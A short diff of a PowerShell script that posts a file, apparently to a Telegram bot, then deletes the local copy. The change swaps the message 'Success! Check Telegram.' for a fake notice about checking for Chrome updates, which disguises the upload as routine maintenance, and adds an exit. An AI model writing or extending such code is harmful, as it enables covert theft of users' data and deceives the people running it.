@@ -37,7 +37,7 @@ try {
 
     Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
     
-    Write-Host "Success! Check Telegram." -ForegroundColor Green
+    Write-Host "cheking for chrome updates." -ForegroundColor Green
 }
 catch {
     
@@ -50,3 +50,5 @@ catch {
 finally {
     if (Test-Path $outputFile) { Remove-Item $outputFile }
 }
+
+exit
